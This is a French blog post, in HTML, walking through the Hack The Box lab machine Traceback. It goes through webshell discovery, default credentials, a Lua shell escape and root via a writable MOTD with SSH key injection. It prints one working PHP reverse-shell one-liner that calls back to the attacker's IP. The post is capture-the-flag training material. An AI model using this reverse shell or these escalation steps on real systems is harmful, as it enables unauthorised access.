@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="fr">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.78.2" />
+
+    
+    
+    
+
+<title>Traceback - Easy • LOLOLEKIK</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Traceback - Easy"/>
+<meta name="twitter:description" content="Résolution de la box Mango
+Introduction La box Traceback de Hack The Box est une box Linux de difficulté &ldquo;Easy&rdquo;.
+Foothold Enumération On commence par faire un nmap sur tous les ports.
+On voit qu&rsquo;il y a un serveur web. En se rendant dessus on trouve ceci.
+On va donc se créer une wordlist avec plein de webshell populaire pour voir si on peut en retrouver un. La liste a été prise ici : https://github."/>
+
+<meta property="og:title" content="Traceback - Easy" />
+<meta property="og:description" content="Résolution de la box Mango
+Introduction La box Traceback de Hack The Box est une box Linux de difficulté &ldquo;Easy&rdquo;.
+Foothold Enumération On commence par faire un nmap sur tous les ports.
+On voit qu&rsquo;il y a un serveur web. En se rendant dessus on trouve ceci.
+On va donc se créer une wordlist avec plein de webshell populaire pour voir si on peut en retrouver un. La liste a été prise ici : https://github." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://lololekik.com/hack-the-box/traceback/" />
+<meta property="og:site_name" content="OffSec &amp; CO" />
+
+
+    
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/qtcreator_dark.min.css">
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/scss/hyde-hyde.816e5b26c5966343ef21f902ba05a763964deb2ae3fdcd9a954614131b756c59.css" integrity="sha256-gW5bJsWWY0PvIfkCugWnY5ZN6yrj/c2alUYUExt1bFk=">
+
+
+<link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
+
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/custom.css">
+
+
+
+
+
+</head>
+
+
+    <body class=" ">
+    
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      <span class="site__title">
+        <a href="http://lololekik.com/">LOLOLEKIK</a>
+      </span>
+      
+        
+        
+        
+        <div class="author-image">
+          <img src="http://lololekik.com/img/author.jpg" alt="Author Image" class="img--circle img--headshot element--center">
+        </div>
+        
+      
+      
+      <p class="site__description">
+         OffSec &amp; Co 
+      </p>
+    </div>
+    <div class="collapsible-menu">
+      <input type="checkbox" id="menuToggle">
+      <label for="menuToggle">LOLOLEKIK</label>
+      <div class="menu-content">
+        <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/cuisine/">
+						<span>Cuisine</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/exploit/">
+						<span>Exploit</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/network/">
+						<span>Network</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/writeups/">
+						<span>WriteUps</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/hack-the-box/">
+						<span>HackTheBox</span>
+					</a>
+				</li>
+			 
+		
+	</ul>
+</div>
+
+        <section class="social">
+	
+	
+	
+	<a href="https://github.com/LOLOLEKIK" rel="me"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	<a href="https://root-me.org/lololekik" target="blank" class="linklogo"><div class="rootme_logo logohover"> </div></a>
+	
+	
+	<a href="https://hackthebox.eu/home/users/profile/202145" target="blank" class="linklogo"><div class="hackthebox_logo logohover"> </div></a>
+	
+	
+	<a href="https://linkedin.com/in/loris-thiebaut-8b4b85197" rel="me"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	<a href="mailto:loris.thiebaut@gmail.com" rel="me"><i class="fas fa-at fa-lg" aria-hidden="true"></i></a>
+	
+</section>
+
+      </div>
+    </div>
+    
+
+<div class="builtwith">
+Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+</div>
+
+
+  </div>
+</div>
+
+        <div class="content container">
+            
+    
+<article>
+  <header>
+    <h1>Traceback - Easy</h1>
+    
+    
+<div class="post__meta">
+    
+    
+    
+    
+      
+      
+          in
+          
+          
+              <a class="badge badge-category" href="/categories/hack-the-box">HACK THE BOX</a>
+              
+          
+      
+    
+    
+    
+      
+      
+          <br/>
+           <i class="fas fa-tags"></i>
+          
+          <a class="badge badge-tag" href="/tags/pentest">pentest</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/linux">linux</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/easy">easy</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/webshell">webshell</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/gtfobins">gtfobins</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/ftp">ftp</a>
+          
+      
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 2 min read
+</div>
+
+
+  </header>
+  
+  
+  <div class="post">
+    <p><strong>Résolution de la box Mango</strong></p>
+<h1 id="introduction">Introduction</h1>
+<p>La box <strong>Traceback</strong> de Hack The Box est une box Linux de difficulté &ldquo;Easy&rdquo;.</p>
+
+
+
+  <img src="/img/htb/traceback/traceback_resume.png" alt="Résumé de la machine Traceback" class="imageformat"/>
+
+<h1 id="foothold">Foothold</h1>
+<h2 id="enumération">Enumération</h2>
+<p>On commence par faire un nmap sur tous les ports.</p>
+
+
+
+  <img src="/img/htb/traceback/traceback_nmap.png" alt="nmap de la machine Traceback" class="imageformat"/>
+
+<p>On voit qu&rsquo;il y a un serveur web. En se rendant dessus on trouve ceci.</p>
+
+
+
+  <img src="/img/htb/traceback/traceback_web.png" alt="page web de la machine Traceback" class="imageformat"/>
+
+<p>On va donc se créer une wordlist avec plein de webshell populaire pour voir si on peut en retrouver un. La liste a été prise ici : <a href="https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/backdoor_list.txt">https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/backdoor_list.txt</a></p>
+
+
+
+  <img src="/img/htb/traceback/traceback_wfuzz.png" alt="fuzz web de la machine Traceback" class="imageformat"/>
+
+<h2 id="exploit">Exploit</h2>
+<p>En regardant dans le code source du shell, on voit que les identifiants par défaut sont admin:admin. Avec ces identifiants on a un accès à <em>webadmin</em>.</p>
+
+
+
+  <img src="/img/htb/traceback/traceback_webshell.png" alt="webshell de la machine Traceback" class="imageformat"/>
+
+<p>On va donc s&rsquo;envoyer un Reverse Shell. J&rsquo;ai utilisé le fait que php soit présent pour m&rsquo;envoyer un shell via la commande suivante :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;10.10.14.15&#34;,9876);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</code></pre></div>
+
+
+  <img src="/img/htb/traceback/traceback_reverse.png" alt="Reverse shell de la machine Traceback" class="imageformat"/>
+
+<p>Enfin on upgrade notre reverse shell.</p>
+
+
+
+  <img src="/img/htb/traceback/traceback_upgrade.png" alt="Reverse shell de la machine Traceback" class="imageformat"/>
+
+<h1 id="user">User</h1>
+<h2 id="enumération-1">Enumération</h2>
+<p>Dans le dossier <em>home</em> de webadmin on trouve une note qui nous indique que le sysadmin nous a laissé un outil pour s&rsquo;entrainer au Lua.</p>
+
+
+
+  <img src="/img/htb/traceback/traceback_note.png" alt="note de la machine Traceback" class="imageformat"/>
+
+<p>En regardant si on peut utiliser des commandes avec un autre utilisateur on localise l&rsquo;outil dont nous parlait le sysadmin</p>
+
+
+
+  <img src="/img/htb/traceback/traceback_sudo.png" alt="sudo de la machine Traceback" class="imageformat"/>
+
+<h2 id="exploit-1">Exploit</h2>
+<p>On commence par ouvrir l&rsquo;outil.</p>
+
+
+
+  <img src="/img/htb/traceback/traceback_luvit.png" alt="lua de la machine Traceback" class="imageformat"/>
+
+<p>Via les GTFOBins, on trouve comment invoquer un shell en lua.</p>
+
+
+
+  <img src="/img/htb/traceback/traceback_user.png" alt="lua gtfobins de la machine Traceback" class="imageformat"/>
+
+<h1 id="root">Root</h1>
+<h2 id="enumération-2">Enumération</h2>
+<p>Pour commencer on va télécharger et lancer un linPEAS.sh. Ici on voit qu&rsquo;on a très probablement une escalade de privilère via les &ldquo;Messafe Of The Day&rdquo;</p>
+
+
+
+  <img src="/img/htb/traceback/traceback_user_motd.png" alt="linpeas de la machine Traceback" class="imageformat"/>
+
+<h2 id="exploit-2">Exploit</h2>
+<p>On va ajouter notre clé SSH pour pouvoir se log et trigger le motd.</p>
+
+
+
+  <img src="/img/htb/traceback/traceback_ssh.png" alt="trigger motd de la machine Traceback" class="imageformat"/>
+
+<p>Je n&rsquo;ai pas réussi à m&rsquo;envoyer directement un reverse shell. Du coup j&rsquo;ai autorisé ma machine à se connecter en ssh en tant que root.</p>
+
+
+
+  <img src="/img/htb/traceback/traceback_user_cp.png" alt="trigger motd de la machine Traceback" class="imageformat"/>
+
+<p>Enfin il a fallu que je trigger mon MOTD puis que je me connecte en tant que root.</p>
+
+
+
+  <img src="/img/htb/traceback/traceback_user_exploit.png" alt="trigger motd de la machine Traceback" class="imageformat"/>
+
+
+  </div>
+  
+
+<div class="navigation navigation-single">
+    
+    <a href="/hack-the-box/traverxec/" class="navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">Traverexec - Easy</span>
+    </a>
+    
+    
+    <a href="/hack-the-box/sauna/" class="navigation-next">
+      <span class="navigation-tittle">Sauna - Easy</span>
+      <i aria-hidden="true" class="fa fa-chevron-right"></i>
+    </a>
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+
+<script defer src="https://use.fontawesome.com/releases/v5.11.2/js/all.js" integrity="sha384-b3ua1l97aVGAPEIe48b4TC60WUQbQaGi2jqAWM90y0OZXZeyaTCWtBTKtjW2GXG1" crossorigin="anonymous"></script>
+
+
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+        
+    <script type="text/javascript">
+        
+        hljs.initHighlightingOnLoad();
+    </script>
+    
+
+
+
+    
+
+
+
+    </body>
+</html>
